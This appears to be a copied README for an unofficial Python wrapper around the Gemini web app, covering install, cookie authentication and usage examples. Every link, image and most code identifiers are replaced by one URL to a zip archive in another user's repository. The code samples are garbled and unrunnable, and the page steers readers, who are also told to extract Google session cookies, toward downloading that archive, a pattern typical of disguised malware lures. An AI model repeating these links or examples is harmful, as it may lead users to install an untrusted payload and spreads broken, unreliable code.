<p align="center">
    <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" width="55%" alt="Gemini Banner" align="center">
</p>
<p align="center">
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="PyPI"></a>
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="Downloads"></a>
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="Dependencies"></a>
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="License"></a>
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip%https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="Code style"></a>
</p>
<p align="center">
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="GitHub stars"></a>
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="GitHub issues"></a>
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" alt="CI"></a>
</p>

# <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" width="35px" alt="Gemini Icon" /> Gemini-API

A reverse-engineered asynchronous python wrapper for [Google Gemini](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip) web app (formerly Bard).

## Features

- **Persistent Cookies** - Automatically refreshes cookies in background. Optimized for always-on services.
- **Image Generation** - Natively supports generating and modifying images with natural language.
- **Extension Support** - Supports generating contents with [Gemini extensions](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip) on, like YouTube and Gmail.
- **Classified Outputs** - Automatically categorizes texts, web images and AI generated images in the response.
- **Official Flavor** - Provides a simple and elegant interface inspired by [Google Generative AI](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)'s official API.
- **Asynchronous** - Utilizes `asyncio` to run generating tasks and return outputs efficiently.

## Table of Contents

- [Features](#features)
- [Table of Contents](#table-of-contents)
- [Installation](#installation)
- [Authentication](#authentication)
- [Usage](#usage)
  - [Initialization](#initialization)
  - [Select language model](#select-language-model)
  - [Generate contents from text](#generate-contents-from-text)
  - [Generate contents with files](#generate-contents-with-files)
  - [Conversations across multiple turns](#conversations-across-multiple-turns)
  - [Continue previous conversations](#continue-previous-conversations)
  - [Retrieve model's thought process](#retrieve-models-thought-process)
  - [Retrieve images in response](#retrieve-images-in-response)
  - [Generate images with Imagen3](#generate-images-with-imagen3)
  - [Generate contents with Gemini extensions](#generate-contents-with-gemini-extensions)
  - [Check and switch to other reply candidates](#check-and-switch-to-other-reply-candidates)
  - [Logging Configuration](#logging-configuration)
- [References](#references)
- [Stargazers](#stargazers)

## Installation

> [!NOTE]
>
> This package requires Python 3.10 or higher.

Install/update the package with pip.

```bash
pip install -U gemini_webapi
```

Optionally, package offers a way to automatically import cookies from your local browser. To enable this feature, install `browser-cookie3` as well. Supported platforms and browsers can be found [here](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip).

```bash
pip install -U browser-cookie3
```

## Authentication

> [!TIP]
>
> If `browser-cookie3` is installed, you can skip this step and go directly to [usage](#usage) section. Just make sure you have logged in to <https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip> in your browser.

- Go to <https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip> and login with your Google account
- Press F12 for web inspector, go to `Network` tab and refresh the page
- Click any request and copy cookie values of `__Secure-1PSID` and `__Secure-1PSIDTS`

> [!NOTE]
>
> If your application is deployed in a containerized environment (e.g. Docker), you may want to persist the cookies with a volume to avoid re-authentication every time the container rebuilds.
>
> Here's part of a sample `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` file:

```yaml
services:
    main:
        volumes:
            - ./gemini_cookies:/usr/local/lib/python3.12/site-packages/gemini_webapi/utils/temp
```

> [!NOTE]
>
> API's auto cookie refreshing feature doesn't require `browser-cookie3`, and by default is enabled. It allows you to keep the API service running without worrying about cookie expiration.
>
> This feature may cause that you need to re-login to your Google account in the browser. This is an expected behavior and won't affect the API's functionality.
>
> To avoid such result, it's recommended to get cookies from a separate browser session and close it as asap for best utilization (e.g. a fresh login in browser's private mode). More details can be found [here](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip).

## Usage

### Initialization

Import required packages and initialize a client with your cookies obtained from the previous step. After a successful initialization, the API will automatically refresh `__Secure-1PSIDTS` in background as long as the process is alive.

```python
import asyncio
from gemini_webapi import GeminiClient

# Replace "COOKIE VALUE HERE" with your actual cookie values.
# Leave Secure_1PSIDTS empty if it's not available for your account.
Secure_1PSID = "COOKIE VALUE HERE"
Secure_1PSIDTS = "COOKIE VALUE HERE"

async def main():
    # If browser-cookie3 is installed, simply use `client = GeminiClient()`
    client = GeminiClient(Secure_1PSID, Secure_1PSIDTS, proxy=None)
    await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(timeout=30, auto_close=False, close_delay=300, auto_refresh=True)

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

> [!TIP]
>
> `auto_close` and `close_delay` are optional arguments for automatically closing the client after a certain period of inactivity. This feature is disabled by default. In an always-on service like chatbot, it's recommended to set `auto_close` to `True` combined with reasonable seconds of `close_delay` for better resource management.

### Select language model

You can specify which language model to use by passing `model` argument to `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` or `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip`. The default value is `unspecified`.

Currently available models (as of Feb 5, 2025):

- `unspecified` - Default model
- `gemini-2.0-flash` - Gemini 2.0 Flash
- `gemini-2.0-flash-thinking` - Gemini 2.0 Flash Thinking Experimental
- `gemini-2.5-flash` - Gemini 2.5 Flash
- `gemini-2.5-pro` - Gemini 2.5 Pro (daily usage limit imposed)

Models pending update (may not work as expected):

- `gemini-2.5-exp-advanced` - Gemini 2.5 Experimental Advanced **(requires Gemini Advanced account)**
- `gemini-2.0-exp-advanced` - Gemini 2.0 Experimental Advanced **(requires Gemini Advanced account)**

```python
from https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip import Model

async def main():
    response1 = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(
        "What's you language model version? Reply version number only.",
        model=Model.G_2_0_FLASH,
    )
    print(f"Model version ({https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip}): {https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip}")

    chat = https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(model="gemini-2.0-flash-thinking")
    response2 = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("What's you language model version? Reply version number only.")
    print(f"Model version (gemini-2.0-flash-thinking): {https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip}")

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

### Generate contents from text

Ask a one-turn quick question by calling `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip`.

```python
async def main():
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("Hello World!")
    print(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

> [!TIP]
>
> Simply use `print(response)` to get the same output if you just want to see the response text

### Generate contents with files

Gemini supports file input, including images and documents. Optionally, you can pass files as a list of paths in `str` or `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` to `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` together with text prompt.

```python
async def main():
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(
            "Introduce the contents of these two files. Is there any connection between them?",
            files=["https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip", Path("https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip")],
        )
    print(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

### Conversations across multiple turns

If you want to keep conversation continuous, please use `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` to create a `ChatSession` object and send messages through it. The conversation history will be automatically handled and get updated after each turn.

```python
async def main():
    chat = https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip()
    response1 = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(
        "Introduce the contents of these two files. Is there any connection between them?",
        files=["https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip", Path("https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip")],
    )
    print(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)
    response2 = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(
        "Use image generation tool to modify the banner with another font and design."
    )
    print(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip, https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip, sep="\n\n----------------------------------\n\n")

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

> [!TIP]
>
> Same as `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip`, `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` also accepts `image` as an optional argument.

### Continue previous conversations

To manually retrieve previous conversations, you can pass previous `ChatSession`'s metadata to `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` when creating a new `ChatSession`. Alternatively, you can persist previous metadata to a file or db if you need to access them after the current Python process has exited.

```python
async def main():
    # Start a new chat session
    chat = https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip()
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("Fine weather today")

    # Save chat's metadata
    previous_session = https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip

    # Load the previous conversation
    previous_chat = https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(metadata=previous_session)
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("What was my previous message?")
    print(response)

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

### Retrieve model's thought process

When using models with thinking capabilities, the model's thought process will be populated in `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip`.

```python
async def main():
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(
            "What's 1+1?", model="gemini-2.0-flash-thinking"
        )
    print(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)
    print(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

### Retrieve images in response

Images in the API's output are stored as a list of `Image` objects. You can access the image title, URL, and description by calling `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip`, `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` and `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip` respectively.

```python
async def main():
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("Send me some pictures of cats")
    for image in https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip
        print(image, "\n\n----------------------------------\n")

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

### Generate images with Imagen3

You can ask Gemini to generate and modify images with Imagen3, Google's latest AI image generator, simply by natural language.

> [!IMPORTANT]
>
> Google has some limitations on the image generation feature in Gemini, so its availability could be different per region/account. Here's a summary copied from [official documentation](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip) (as of March 19th, 2025):
>
> > This feature’s availability in any specific Gemini app is also limited to the supported languages and countries of that app.
> >
> > For now, this feature isn’t available to users under 18.
> >
> > To use this feature, you must be signed in to Gemini Apps.

You can save images returned from Gemini to local by calling `https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip()`. Optionally, you can specify the file path and file name by passing `path` and `filename` arguments to the function and skip images with invalid file names by passing `skip_invalid_filename=True`. Works for both `WebImage` and `GeneratedImage`.

```python
async def main():
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("Generate some pictures of cats")
    for i, image in enumerate(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip):
        await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(path="temp/", filename=f"cat_{i}.png", verbose=True)
        print(image, "\n\n----------------------------------\n")

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

> [!NOTE]
>
> by default, when asked to send images (like the previous example), Gemini will send images fetched from web instead of generating images with AI model, unless you specifically require to "generate" images in your prompt. In this package, web images and generated images are treated differently as `WebImage` and `GeneratedImage`, and will be automatically categorized in the output.

### Generate contents with Gemini extensions

> [!IMPORTANT]
>
> To access Gemini extensions in API, you must activate them on the [Gemini website](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip) first. Same as image generation, Google also has limitations on the availability of Gemini extensions. Here's a summary copied from [official documentation](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip) (as of March 19th, 2025):
>
> > To connect apps to Gemini, you must have​​​​ Gemini Apps Activity on.
> >
> > To use this feature, you must be signed in to Gemini Apps.
> >
> > Important: If you’re under 18, Google Workspace and Maps apps currently only work with English prompts in Gemini.

After activating extensions for your account, you can access them in your prompts either by natural language or by starting your prompt with "@" followed by the extension keyword.

```python
async def main():
    response1 = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("@Gmail What's the latest message in my mailbox?")
    print(response1, "\n\n----------------------------------\n")

    response2 = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("@Youtube What's the latest activity of Taylor Swift?")
    print(response2, "\n\n----------------------------------\n")

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

> [!NOTE]
>
> For the available regions limitation, it actually only requires your Google account's **preferred language** to be set to one of the three supported languages listed above. You can change your language settings [here](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip).

### Check and switch to other reply candidates

A response from Gemini usually contains multiple reply candidates with different generated contents. You can check all candidates and choose one to continue the conversation. By default, the first candidate will be chosen automatically.

```python
async def main():
    # Start a conversation and list all reply candidates
    chat = https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip()
    response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("Recommend a science fiction book for me.")
    for candidate in https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip
        print(candidate, "\n\n----------------------------------\n")

    if len(https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip) > 1:
        # Control the ongoing conversation flow by choosing candidate manually
        new_candidate = https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(index=1)  # Choose the second candidate here
        followup_response = await https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip("Tell me more about it.")  # Will generate contents based on the chosen candidate
        print(new_candidate, followup_response, sep="\n\n----------------------------------\n\n")
    else:
        print("Only one candidate available.")

https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip(main())
```

### Logging Configuration

This package uses [loguru](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip) for logging, and exposes a function `set_log_level` to control log level. You can set log level to one of the following values: `DEBUG`, `INFO`, `WARNING`, `ERROR` and `CRITICAL`. The default value is `INFO`.

```python
from gemini_webapi import set_log_level

set_log_level("DEBUG")
```

> [!NOTE]
>
> Calling `set_log_level` for the first time will **globally** remove all existing loguru handlers. You may want to configure logging directly with loguru to avoid this issue and have more advanced control over logging behaviors.

## References

[Google AI Studio](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)

[acheong08/Bard](https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip)

## Stargazers

<p align="center">
    <a href="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip">
        <img src="https://raw.githubusercontent.com/lockadi8/Gemini-API/master/assets/API-Gemini-v3.6-beta.5.zip" width="75%" alt="Star History Chart"></a>
</p>
